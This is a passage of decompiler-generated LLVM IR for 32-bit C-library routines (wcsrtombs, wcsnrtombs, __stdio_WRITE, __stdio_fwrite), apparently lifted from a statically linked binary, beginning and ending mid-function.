  %v2_804df34 = ptrtoint i32* %stack_var_-8 to i32
  %v5_804df3a = inttoptr i32 %v0_804df39 to i8*
  %v6_804df3a = call i32 @__GI_wcsnrtombs(i8* %v5_804df3a, i32 %v2_804df34, i32 1, i32 16, i32 %tmp)
  %v1_804df42 = icmp eq i32 %v6_804df3a, 0
  %v1_804df44 = icmp eq i1 %v1_804df42, false
  br i1 %v1_804df44, label %dec_label_pc_804df48, label %dec_label_pc_804df46

dec_label_pc_804df46:                             ; preds = %dec_label_pc_804df1d
  %v1_804df46 = and i32 %v6_804df3a, -256
  %v2_804df46 = or i32 %v1_804df46, 1
  br label %dec_label_pc_804df48

dec_label_pc_804df48:                             ; preds = %dec_label_pc_804df1d, %dec_label_pc_804df46
  %v0_804df4b = phi i32 [ %v6_804df3a, %dec_label_pc_804df1d ], [ %v2_804df46, %dec_label_pc_804df46 ]
  ret i32 %v0_804df4b

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_804df48, { 1, 0 }
  uselistorder label %dec_label_pc_804df1d, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_804df61 = inttoptr i32 %tmp to i8*
  %v6_804df61 = call i32 @__GI_wcsnrtombs(i8* %v5_804df61, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_804df61
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804df6f = load i32, i32* @ebx, align 4
  %v4_804df73 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804df73, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_804df7f = icmp eq i8* %arg1, null
  br i1 %v1_804df7f, label %dec_label_pc_804dfb3.thread, label %dec_label_pc_804df83

dec_label_pc_804df83:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_804df88 = icmp eq i32 %v4_804df73, %arg2
  %v1_804df8a = icmp eq i1 %v12_804df88, false
  br i1 %v1_804df8a, label %dec_label_pc_804dfb3, label %dec_label_pc_804dfad

dec_label_pc_804dfb3.thread:                      ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804df90 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804df90, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dfbd

dec_label_pc_804df99:                             ; preds = %dec_label_pc_804dfc4
  %v1_804df99 = call i32 @__errno_location(i32 %v0_804df6f)
  store i32 %v1_804df99, i32* %eax.global-to-local, align 4
  %v1_804df9e = inttoptr i32 %v1_804df99 to i32*
  store i32 84, i32* %v1_804df9e, align 4
  br label %dec_label_pc_804dfea

dec_label_pc_804dfa9:                             ; preds = %dec_label_pc_804dfcb
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_804dfdf.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804dfdb

dec_label_pc_804dfad:                             ; preds = %dec_label_pc_804df83
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804dfaf = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804dfaf, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804dfb3

dec_label_pc_804dfb3:                             ; preds = %dec_label_pc_804df83, %dec_label_pc_804dfad
  %v2_804dfcb15 = phi i32 [ %v4_804df73, %dec_label_pc_804df83 ], [ %v2_804dfaf, %dec_label_pc_804dfad ]
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %tmp33 = icmp ult i32 %arg4, %arg3
  br i1 %tmp33, label %dec_label_pc_804dfbb, label %dec_label_pc_804dfbd

dec_label_pc_804dfbb:                             ; preds = %dec_label_pc_804dfb3
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dfbd

dec_label_pc_804dfbd:                             ; preds = %dec_label_pc_804dfb3.thread, %dec_label_pc_804dfb3, %dec_label_pc_804dfbb
  %v2_804dfcb1532 = phi i32 [ %v2_804dfcb15, %dec_label_pc_804dfb3 ], [ %v2_804dfcb15, %dec_label_pc_804dfbb ], [ %v2_804df90, %dec_label_pc_804dfb3.thread ]
  %v0_804dfc0 = phi i32 [ %arg3, %dec_label_pc_804dfb3 ], [ %arg4, %dec_label_pc_804dfbb ], [ %arg3, %dec_label_pc_804dfb3.thread ]
  %v1_804dfbd = inttoptr i32 %arg2 to i32*
  %v2_804dfbd = load i32, i32* %v1_804dfbd, align 4
  store i32 %v2_804dfbd, i32* %esi.global-to-local, align 4
  store i32 %v0_804dfc0, i32* @ecx, align 4
  %v1_804dfd73 = icmp eq i32 %v0_804dfc0, 0
  %v1_804dfd910 = icmp eq i1 %v1_804dfd73, false
  br i1 %v1_804dfd910, label %dec_label_pc_804dfc4, label %dec_label_pc_804dfdb

dec_label_pc_804dfc4:                             ; preds = %dec_label_pc_804dfbd, %dec_label_pc_804dfd1
  %v2_804dfcb = phi i32 [ %v2_804dfd4, %dec_label_pc_804dfd1 ], [ %v2_804dfcb1532, %dec_label_pc_804dfbd ]
  %v0_804dfc4 = phi i32 [ %v1_804dfd1, %dec_label_pc_804dfd1 ], [ %v2_804dfbd, %dec_label_pc_804dfbd ]
  %v1_804dfc4 = inttoptr i32 %v0_804dfc4 to i32*
  %v2_804dfc4 = load i32, i32* %v1_804dfc4, align 4
  store i32 %v2_804dfc4, i32* %eax.global-to-local, align 4
  %v6_804dfc9 = icmp ugt i32 %v2_804dfc4, 127
  br i1 %v6_804dfc9, label %dec_label_pc_804df99, label %dec_label_pc_804dfcb

dec_label_pc_804dfcb:                             ; preds = %dec_label_pc_804dfc4
  %v1_804dfcb = trunc i32 %v2_804dfc4 to i8
  %v3_804dfcb = inttoptr i32 %v2_804dfcb to i8*
  store i8 %v1_804dfcb, i8* %v3_804dfcb, align 1
  %v0_804dfcd = load i32, i32* %eax.global-to-local, align 4
  %v3_804dfcd = trunc i32 %v0_804dfcd to i8
  %v4_804dfcd = icmp eq i8 %v3_804dfcd, 0
  br i1 %v4_804dfcd, label %dec_label_pc_804dfa9, label %dec_label_pc_804dfd1

dec_label_pc_804dfd1:                             ; preds = %dec_label_pc_804dfcb
  %v0_804dfd1 = load i32, i32* %esi.global-to-local, align 4
  %v1_804dfd1 = add i32 %v0_804dfd1, 4
  store i32 %v1_804dfd1, i32* %esi.global-to-local, align 4
  %v0_804dfd4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dfd4 = load i32, i32* %edi.global-to-local, align 4
  %v2_804dfd4 = add i32 %v1_804dfd4, %v0_804dfd4
  store i32 %v2_804dfd4, i32* %edx.global-to-local, align 4
  %v0_804dfd6 = load i32, i32* @ecx, align 4
  %v1_804dfd6 = add i32 %v0_804dfd6, -1
  %v8_804dfd6 = icmp eq i32 %v1_804dfd6, 0
  store i32 %v1_804dfd6, i32* @ecx, align 4
  %v1_804dfd9 = icmp eq i1 %v8_804dfd6, false
  br i1 %v1_804dfd9, label %dec_label_pc_804dfc4, label %dec_label_pc_804dfdb

dec_label_pc_804dfdb:                             ; preds = %dec_label_pc_804dfd1, %dec_label_pc_804dfbd, %dec_label_pc_804dfa9
  %v0_804dfe3 = phi i32 [ 0, %dec_label_pc_804dfa9 ], [ %v2_804dfbd, %dec_label_pc_804dfbd ], [ %v1_804dfd1, %dec_label_pc_804dfd1 ]
  %v0_804dfdf = phi i32 [ %v0_804dfdf.pre, %dec_label_pc_804dfa9 ], [ %v2_804dfcb1532, %dec_label_pc_804dfbd ], [ %v2_804dfd4, %dec_label_pc_804dfd1 ]
  %v2_804dfdb = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804dfdb, i32* %eax.global-to-local, align 4
  %v12_804dfdf = icmp eq i32 %v0_804dfdf, %v2_804dfdb
  br i1 %v12_804dfdf, label %dec_label_pc_804dfe6, label %dec_label_pc_804dfe3

dec_label_pc_804dfe3:                             ; preds = %dec_label_pc_804dfdb
  %v1_804dfe3 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804dfe3 = inttoptr i32 %v1_804dfe3 to i32*
  store i32 %v0_804dfe3, i32* %v2_804dfe3, align 4
  br label %dec_label_pc_804dfe6

dec_label_pc_804dfe6:                             ; preds = %dec_label_pc_804dfdb, %dec_label_pc_804dfe3
  %v0_804dfe6 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804dfe6, i32* %eax.global-to-local, align 4
  %v1_804dfe8 = load i32, i32* @ecx, align 4
  %v2_804dfe8 = sub i32 %v0_804dfe6, %v1_804dfe8
  br label %dec_label_pc_804dfea

dec_label_pc_804dfea:                             ; preds = %dec_label_pc_804df99, %dec_label_pc_804dfe6
  %storemerge1 = phi i32 [ %v2_804dfe8, %dec_label_pc_804dfe6 ], [ -1, %dec_label_pc_804df99 ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_804df6f, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_804dfd4, { 0, 2, 1 }
  uselistorder i32 %v1_804dfd1, { 0, 2, 1 }
  uselistorder i32 %v2_804dfbd, { 1, 0, 2 }
  uselistorder i32 %v0_804dfc0, { 1, 0 }
  uselistorder i32 %v2_804dfcb1532, { 1, 0 }
  uselistorder i32 %v4_804df73, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 1, 0, 4, 2, 3, 5 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dfea, { 1, 0 }
  uselistorder label %dec_label_pc_804dfe6, { 1, 0 }
  uselistorder label %dec_label_pc_804dfc4, { 1, 0 }
  uselistorder label %dec_label_pc_804dfbd, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804dfb3, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_804dff5 = load i32, i32* @edi, align 4
  %v0_804dff7 = load i32, i32* @ebx, align 4
  %v4_804dffb = ptrtoint i16* %arg1 to i32
  store i32 %v4_804dffb, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_804e0074 = icmp eq i32 %arg3, 0
  br i1 %v1_804e0074, label %dec_label_pc_804e066, label %dec_label_pc_804e00c.lr.ph

dec_label_pc_804e00c.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804e00c

dec_label_pc_804e00c:                             ; preds = %dec_label_pc_804e02b.dec_label_pc_804e00c_crit_edge, %dec_label_pc_804e00c.lr.ph
  %v0_804e01c = phi i32 [ %v4_804dffb, %dec_label_pc_804e00c.lr.ph ], [ %v0_804e01c.pre, %dec_label_pc_804e02b.dec_label_pc_804e00c_crit_edge ]
  %v0_804e01b = phi i32 [ %arg2, %dec_label_pc_804e00c.lr.ph ], [ %v2_804e02d, %dec_label_pc_804e02b.dec_label_pc_804e00c_crit_edge ]
  %v0_804e00e.in = phi i32 [ %arg3, %dec_label_pc_804e00c.lr.ph ], [ %v2_804e02b, %dec_label_pc_804e02b.dec_label_pc_804e00c_crit_edge ]
  %v0_804e00e = icmp slt i32 %v0_804e00e.in, 0
  store i32 %v0_804e00e.in, i32* %ebp.global-to-local, align 4
  %v2_804e00e = icmp eq i1 %v0_804e00e, false
  %storemerge = select i1 %v2_804e00e, i32 %v0_804e00e.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804e01c = add i32 %v0_804e01c, 4
  %v2_804e01c = inttoptr i32 %v1_804e01c to i32*
  %v3_804e01c = load i32, i32* %v2_804e01c, align 4
  %tmp36 = inttoptr i32 %v0_804e01b to i32*
  %v5_804e01f = call i32 @__libc_write(i32 %v3_804e01c, i32* %tmp36, i32 %storemerge)
  store i32 %v5_804e01f, i32* %eax.global-to-local, align 4
  %v2_804e027 = icmp slt i32 %v5_804e01f, 0
  br i1 %v2_804e027, label %dec_label_pc_804e031, label %dec_label_pc_804e02b

dec_label_pc_804e02b:                             ; preds = %dec_label_pc_804e00c
  %v0_804e02b = load i32, i32* @ebx, align 4
  %v2_804e02b = sub i32 %v0_804e02b, %v5_804e01f
  %v12_804e02b = icmp eq i32 %v2_804e02b, 0
  store i32 %v2_804e02b, i32* @ebx, align 4
  %v0_804e02d = load i32, i32* %esi.global-to-local, align 4
  %v2_804e02d = add i32 %v0_804e02d, %v5_804e01f
  store i32 %v2_804e02d, i32* %esi.global-to-local, align 4
  br i1 %v12_804e02b, label %dec_label_pc_804e066, label %dec_label_pc_804e02b.dec_label_pc_804e00c_crit_edge

dec_label_pc_804e02b.dec_label_pc_804e00c_crit_edge: ; preds = %dec_label_pc_804e02b
  %v0_804e01c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e00c

dec_label_pc_804e031:                             ; preds = %dec_label_pc_804e00c
  %v0_804e031 = load i32, i32* @edi, align 4
  %v1_804e031 = add i32 %v0_804e031, 8
  %v2_804e031 = inttoptr i32 %v1_804e031 to i32*
  %v3_804e031 = load i32, i32* %v2_804e031, align 4
  store i32 %v3_804e031, i32* @edx, align 4
  %v1_804e034 = add i32 %v0_804e031, 12
  %v2_804e034 = inttoptr i32 %v1_804e034 to i32*
  %v3_804e034 = load i32, i32* %v2_804e034, align 4
  store i32 %v3_804e034, i32* %eax.global-to-local, align 4
  %v1_804e037 = inttoptr i32 %v0_804e031 to i16*
  %v2_804e037 = load i16, i16* %v1_804e037, align 2
  %v3_804e037 = or i16 %v2_804e037, 8
  store i16 %v3_804e037, i16* %v1_804e037, align 2
  %v0_804e03b = load i32, i32* %eax.global-to-local, align 4
  %v1_804e03b = load i32, i32* @edx, align 4
  %v2_804e03b = sub i32 %v0_804e03b, %v1_804e03b
  %v12_804e03b = icmp eq i32 %v2_804e03b, 0
  store i32 %v2_804e03b, i32* %eax.global-to-local, align 4
  %v4_804e062.pre = load i32, i32* @ebx, align 4
  br i1 %v12_804e03b, label %dec_label_pc_804e062, label %dec_label_pc_804e03f

dec_label_pc_804e03f:                             ; preds = %dec_label_pc_804e031
  %v6_804e041 = icmp ugt i32 %v2_804e03b, %v4_804e062.pre
  br i1 %v6_804e041, label %dec_label_pc_804e045.preheader, label %dec_label_pc_804e043

dec_label_pc_804e043:                             ; preds = %dec_label_pc_804e03f
  store i32 %v2_804e03b, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e045.preheader

dec_label_pc_804e045.preheader:                   ; preds = %dec_label_pc_804e043, %dec_label_pc_804e03f
  %v0_804e045.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e045

dec_label_pc_804e045:                             ; preds = %dec_label_pc_804e045.preheader, %dec_label_pc_804e057
  %v2_804e047 = phi i32 [ %v1_804e03b, %dec_label_pc_804e045.preheader ], [ %v1_804e053, %dec_label_pc_804e057 ]
  %v4_804e045 = phi i32 [ %v2_804e03b, %dec_label_pc_804e045.preheader ], [ %v0_804e049, %dec_label_pc_804e057 ]
  %v0_804e045 = phi i32 [ %v0_804e045.pre, %dec_label_pc_804e045.preheader ], [ %v1_804e057, %dec_label_pc_804e057 ]
  %v1_804e045 = inttoptr i32 %v0_804e045 to i8*
  %v2_804e045 = load i8, i8* %v1_804e045, align 1
  %v3_804e045 = zext i8 %v2_804e045 to i32
  %v5_804e045 = and i32 %v4_804e045, -256
  %v6_804e045 = or i32 %v3_804e045, %v5_804e045
  store i32 %v6_804e045, i32* %eax.global-to-local, align 4
  %v3_804e047 = inttoptr i32 %v2_804e047 to i8*
  store i8 %v2_804e045, i8* %v3_804e047, align 1
  %v0_804e049 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e049 = trunc i32 %v0_804e049 to i8
  %v10_804e049 = icmp eq i8 %v1_804e049, 10
  %v1_804e04b = icmp eq i1 %v10_804e049, false
  br i1 %v1_804e04b, label %dec_label_pc_804e053, label %dec_label_pc_804e04d

dec_label_pc_804e04d:                             ; preds = %dec_label_pc_804e045
  %v0_804e04d = load i32, i32* @edi, align 4
  %v1_804e04d = add i32 %v0_804e04d, 1
  %v2_804e04d = inttoptr i32 %v1_804e04d to i8*
  %v3_804e04d = load i8, i8* %v2_804e04d, align 1
  %v4_804e04d = urem i8 %v3_804e04d, 2
  %v5_804e04d = icmp eq i8 %v4_804e04d, 0
  %v1_804e051 = icmp eq i1 %v5_804e04d, false
  br i1 %v1_804e051, label %dec_label_pc_804e04d.dec_label_pc_804e05a_crit_edge, label %dec_label_pc_804e053

dec_label_pc_804e04d.dec_label_pc_804e05a_crit_edge: ; preds = %dec_label_pc_804e04d
  %v0_804e05a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e05a

dec_label_pc_804e053:                             ; preds = %dec_label_pc_804e04d, %dec_label_pc_804e045
  %v0_804e053 = load i32, i32* @edx, align 4
  %v1_804e053 = add i32 %v0_804e053, 1
  store i32 %v1_804e053, i32* @edx, align 4
  %v0_804e054 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e054 = add i32 %v0_804e054, -1
  %v8_804e054 = icmp eq i32 %v1_804e054, 0
  store i32 %v1_804e054, i32* %ebp.global-to-local, align 4
  br i1 %v8_804e054, label %dec_label_pc_804e053.dec_label_pc_804e05a_crit_edge, label %dec_label_pc_804e057

dec_label_pc_804e053.dec_label_pc_804e05a_crit_edge: ; preds = %dec_label_pc_804e053
  %v1_804e05a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e05a

dec_label_pc_804e057:                             ; preds = %dec_label_pc_804e053
  %v0_804e057 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e057 = add i32 %v0_804e057, 1
  store i32 %v1_804e057, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e045

dec_label_pc_804e05a:                             ; preds = %dec_label_pc_804e053.dec_label_pc_804e05a_crit_edge, %dec_label_pc_804e04d.dec_label_pc_804e05a_crit_edge
  %v1_804e05a = phi i32 [ %v0_804e04d, %dec_label_pc_804e04d.dec_label_pc_804e05a_crit_edge ], [ %v1_804e05a.pre, %dec_label_pc_804e053.dec_label_pc_804e05a_crit_edge ]
  %v0_804e05a = phi i32 [ %v0_804e05a.pre, %dec_label_pc_804e04d.dec_label_pc_804e05a_crit_edge ], [ %v1_804e053, %dec_label_pc_804e053.dec_label_pc_804e05a_crit_edge ]
  %v2_804e05a = add i32 %v1_804e05a, 16
  %v3_804e05a = inttoptr i32 %v2_804e05a to i32*
  store i32 %v0_804e05a, i32* %v3_804e05a, align 4
  %v0_804e05d = load i32, i32* @edx, align 4
  %v1_804e05d = load i32, i32* @edi, align 4
  %v2_804e05d = add i32 %v1_804e05d, 8
  %v3_804e05d = inttoptr i32 %v2_804e05d to i32*
  %v4_804e05d = load i32, i32* %v3_804e05d, align 4
  %v5_804e05d = sub i32 %v0_804e05d, %v4_804e05d
  store i32 %v5_804e05d, i32* @edx, align 4
  %v0_804e060 = load i32, i32* @ebx, align 4
  %v2_804e060 = sub i32 %v0_804e060, %v5_804e05d
  br label %dec_label_pc_804e062

dec_label_pc_804e062:                             ; preds = %dec_label_pc_804e031, %dec_label_pc_804e05a
  %v4_804e062 = phi i32 [ %v2_804e060, %dec_label_pc_804e05a ], [ %v4_804e062.pre, %dec_label_pc_804e031 ]
  %v5_804e062 = sub i32 %arg3, %v4_804e062
  br label %dec_label_pc_804e066

dec_label_pc_804e066:                             ; preds = %dec_label_pc_804e02b, %entry, %dec_label_pc_804e062
  %stack_var_12.0 = phi i32 [ %v5_804e062, %dec_label_pc_804e062 ], [ 0, %entry ], [ %arg3, %dec_label_pc_804e02b ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_804dff7, i32* @ebx, align 4
  store i32 %v0_804dff5, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_804e057, { 1, 0 }
  uselistorder i32 %v1_804e054, { 1, 0 }
  uselistorder i32 %v1_804e053, { 0, 2, 1 }
  uselistorder i32 %v0_804e049, { 1, 0 }
  uselistorder i32 %v2_804e02d, { 1, 0 }
  uselistorder i32 %v2_804e02b, { 1, 2, 0 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_804e066, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e062, { 1, 0 }
  uselistorder label %dec_label_pc_804e045, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e074 = load i32, i32* @ebp, align 4
  %v0_804e075 = load i32, i32* @edi, align 4
  %v0_804e076 = load i32, i32* @esi, align 4
  %v0_804e077 = load i32, i32* @ebx, align 4
  store i32 %v0_804e077, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_804e087 = add i32 %arg3, 1
  %v2_804e087 = inttoptr i32 %v1_804e087 to i8*
  %v3_804e087 = load i8, i8* %v2_804e087, align 1
  %v4_804e087 = and i8 %v3_804e087, 2
  %v5_804e087 = icmp eq i8 %v4_804e087, 0
  %v1_804e08b = icmp eq i1 %v5_804e087, false
  br i1 %v1_804e08b, label %dec_label_pc_804e142, label %dec_label_pc_804e091

dec_label_pc_804e091:                             ; preds = %entry
  %v1_804e091 = add i32 %arg3, 4
  %v2_804e091 = inttoptr i32 %v1_804e091 to i32*
  %v3_804e091 = load i32, i32* %v2_804e091, align 4
  %v13_804e091 = icmp eq i32 %v3_804e091, -2
  %v1_804e095 = add i32 %arg3, 16
  %v2_804e095 = inttoptr i32 %v1_804e095 to i32*
  %v3_804e095 = load i32, i32* %v2_804e095, align 4
  store i32 %v3_804e095, i32* @edx, align 4
  %v1_804e098 = add i32 %arg3, 12
  %v2_804e098 = inttoptr i32 %v1_804e098 to i32*
  %v3_804e098 = load i32, i32* %v2_804e098, align 4
  %v1_804e09b = icmp eq i1 %v13_804e091, false
  %v2_804e0bb = sub i32 %v3_804e098, %v3_804e095
  store i32 %v2_804e0bb, i32* %eax.global-to-local, align 4
  br i1 %v1_804e09b, label %dec_label_pc_804e0bb, label %dec_label_pc_804e09d

dec_label_pc_804e09d:                             ; preds = %dec_label_pc_804e091
  %tmp22 = icmp ult i32 %v2_804e0bb, %arg2
  br i1 %tmp22, label %dec_label_pc_804e0a5, label %dec_label_pc_804e0a7

dec_label_pc_804e0a5:                             ; preds = %dec_label_pc_804e09d
  br label %dec_label_pc_804e0a7

dec_label_pc_804e0a7:                             ; preds = %dec_label_pc_804e09d, %dec_label_pc_804e0a5
  %storemerge = phi i32 [ %v2_804e0bb, %dec_label_pc_804e0a5 ], [ %arg2, %dec_label_pc_804e09d ]
  %v0_804e0a8 = phi i32 [ %v2_804e0bb, %dec_label_pc_804e0a5 ], [ %arg2, %dec_label_pc_804e09d ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_804e0ab = inttoptr i32 %v3_804e095 to i16*
  %v4_804e0ab = call i32 @memcpy(i16* %v3_804e0ab, i32 %v0_804e0a8, i32 %v2_804e0bb)
  store i32 %v4_804e0ab, i32* %eax.global-to-local, align 4
  %v0_804e0b0 = load i32, i32* @ebx, align 4
  %v1_804e0b0 = add i32 %v0_804e0b0, 16
  %v2_804e0b0 = inttoptr i32 %v1_804e0b0 to i32*
  %v3_804e0b0 = load i32, i32* %v2_804e0b0, align 4
  %v4_804e0b0 = load i32, i32* @esi, align 4
  %v5_804e0b0 = add i32 %v4_804e0b0, %v3_804e0b0
  store i32 %v5_804e0b0, i32* %v2_804e0b0, align 4
  br label %dec_label_pc_804e15a

dec_label_pc_804e0bb:                             ; preds = %dec_label_pc_804e091
  %v6_804e0bf = icmp ult i32 %v2_804e0bb, %arg2
  br i1 %v6_804e0bf, label %dec_label_pc_804e129, label %dec_label_pc_804e0c1

dec_label_pc_804e0c1:                             ; preds = %dec_label_pc_804e0bb
  %v0_804e0c1 = load i32, i32* @ecx, align 4
  %v3_804e0c5 = inttoptr i32 %v3_804e095 to i16*
  %v4_804e0c5 = call i32 @memcpy(i16* %v3_804e0c5, i32 %arg2, i32 %v0_804e0c1)
  store i32 %v4_804e0c5, i32* %eax.global-to-local, align 4
  %v0_804e0ca = load i32, i32* @ebx, align 4
  %v1_804e0ca = add i32 %v0_804e0ca, 16
  %v2_804e0ca = inttoptr i32 %v1_804e0ca to i32*
  %v3_804e0ca = load i32, i32* %v2_804e0ca, align 4
  %v4_804e0ca = load i32, i32* @edi, align 4
  %v5_804e0ca = add i32 %v4_804e0ca, %v3_804e0ca
  store i32 %v5_804e0ca, i32* %v2_804e0ca, align 4
  %v0_804e0d0 = load i32, i32* @ebx, align 4
  %v1_804e0d0 = add i32 %v0_804e0d0, 1
  %v2_804e0d0 = inttoptr i32 %v1_804e0d0 to i8*
  %v3_804e0d0 = load i8, i8* %v2_804e0d0, align 1
  %v4_804e0d0 = urem i8 %v3_804e0d0, 2
  %v5_804e0d0 = icmp eq i8 %v4_804e0d0, 0
  br i1 %v5_804e0d0, label %dec_label_pc_804e15a, label %dec_label_pc_804e0da

dec_label_pc_804e0da:                             ; preds = %dec_label_pc_804e0c1
  %v0_804e0da = load i32, i32* @edx, align 4
  %v0_804e0db = load i32, i32* @edi, align 4
  %v4_804e0df = call i32 @memrchr(i8 10, i32 %v0_804e0db, i32 %v0_804e0da)
  store i32 %v4_804e0df, i32* %eax.global-to-local, align 4
  %v1_804e0e7 = icmp eq i32 %v4_804e0df, 0
  br i1 %v1_804e0e7, label %dec_label_pc_804e15a, label %dec_label_pc_804e0eb

dec_label_pc_804e0eb:                             ; preds = %dec_label_pc_804e0da
  %v0_804e0ee = load i32, i32* @ebx, align 4
  %v1_804e0ef = call i32 @__stdio_wcommit(i32 %v0_804e0ee)
  store i32 %v1_804e0ef, i32* %eax.global-to-local, align 4
  %v1_804e0f7 = icmp eq i32 %v1_804e0ef, 0
  br i1 %v1_804e0f7, label %dec_label_pc_804e15a, label %dec_label_pc_804e0fb

dec_label_pc_804e0fb:                             ; preds = %dec_label_pc_804e0eb
  %v0_804e0fb = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_804e0fb, %v1_804e0ef
  br i1 %tmp23, label %dec_label_pc_804e101, label %dec_label_pc_804e103

dec_label_pc_804e101:                             ; preds = %dec_label_pc_804e0fb
  br label %dec_label_pc_804e103

dec_label_pc_804e103:                             ; preds = %dec_label_pc_804e0fb, %dec_label_pc_804e101
  %storemerge24 = phi i32 [ %v1_804e0ef, %dec_label_pc_804e101 ], [ %v0_804e0fb, %dec_label_pc_804e0fb ]
  %v0_804e10a = phi i32 [ %v1_804e0ef, %dec_label_pc_804e101 ], [ %v0_804e0fb, %dec_label_pc_804e0fb ]
  store i32 %storemerge24, i32* %esi.global-to-local, align 4
  %v2_804e105 = sub i32 %v0_804e0fb, %v0_804e10a
  store i32 %v2_804e105, i32* %eax.global-to-local, align 4
  %v0_804e107 = load i32, i32* @ebp, align 4
  %v2_804e107 = add i32 %v0_804e107, %v2_804e105
  store i32 %v2_804e107, i32* %ebp.global-to-local, align 4
  %v4_804e10e = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v0_804e10a, i32 %v2_804e105)
  store i32 %v4_804e10e, i32* %eax.global-to-local, align 4
  store i32 %v4_804e10e, i32* @edx, align 4
  %v1_804e118 = icmp eq i32 %v4_804e10e, 0
  br i1 %v1_804e118, label %dec_label_pc_804e15a, label %dec_label_pc_804e11c

dec_label_pc_804e11c:                             ; preds = %dec_label_pc_804e103
  %v0_804e11c = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e11c = load i32, i32* %esi.global-to-local, align 4
  %v2_804e11c = sub i32 %v0_804e11c, %v4_804e10e
  %v2_804e120 = add i32 %v2_804e11c, %v1_804e11c
  store i32 %v2_804e120, i32* %eax.global-to-local, align 4
